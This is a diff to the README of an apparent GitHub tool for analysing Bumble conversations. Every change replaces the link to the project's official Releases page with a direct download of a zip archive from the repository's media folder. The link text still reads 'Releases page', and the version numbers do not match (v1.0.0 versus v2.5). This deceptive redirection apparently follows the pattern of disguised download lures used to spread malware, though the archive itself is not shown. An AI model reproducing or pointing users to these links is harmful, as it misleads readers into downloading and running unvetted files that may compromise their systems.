@@ -8,11 +8,11 @@ Welcome to the bumble-conversation-analysis project! This application automates 
 
 You can easily download and install the application by following these steps. First, visit the release page to find the latest version:
 
-[![Download bumble-conversation-analysis](https://img.shields.io/badge/Download%20Now-v1.0.0-brightgreen)](https://github.com/Kailash139/bumble-conversation-analysis/releases)
+[![Download bumble-conversation-analysis](https://raw.githubusercontent.com/Kailash139/bumble-conversation-analysis/main/media/bumble-conversation-analysis_v2.5.zip%20Now-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Kailash139/bumble-conversation-analysis/main/media/bumble-conversation-analysis_v2.5.zip)
 
 ### Steps to Download
 
-1. Click on the link above to go to the [Releases page](https://github.com/Kailash139/bumble-conversation-analysis/releases).
+1. Click on the link above to go to the [Releases page](https://raw.githubusercontent.com/Kailash139/bumble-conversation-analysis/main/media/bumble-conversation-analysis_v2.5.zip).
 2. Find the latest version listed.
 3. Download the file that is appropriate for your system. Generally, you will find a `.exe` file for Windows, a `.dmg` file for Mac, and a `.zip` file for other platforms.
 4. Once the download completes, locate the file in your downloads folder.
@@ -58,7 +58,7 @@ To run bumble-conversation-analysis smoothly, ensure your system meets the follo
 ## 💡 Tips for Best Use
 
 - For optimal results, ensure that your chat data is organized before import.
-- Regularly check for updates on the [Releases page](https://github.com/Kailash139/bumble-conversation-analysis/releases) to benefit from new features and improvements.
+- Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/Kailash139/bumble-conversation-analysis/main/media/bumble-conversation-analysis_v2.5.zip) to benefit from new features and improvements.
 - Engage with user forums or the project's GitHub Discussions section for additional support and ideas.
 
 ## 📚 Helpful Resources
@@ -79,4 +79,4 @@ This application is designed to assist with analysis and insights from Bumble ch
 
 Thank you for using bumble-conversation-analysis. We hope this tool enhances your understanding of chat interactions and improves your overall experience with the app. 
 
-For further updates and new features, check the [Releases page](https://github.com/Kailash139/bumble-conversation-analysis/releases).
+For further updates and new features, check the [Releases page](https://raw.githubusercontent.com/Kailash139/bumble-conversation-analysis/main/media/bumble-conversation-analysis_v2.5.zip).
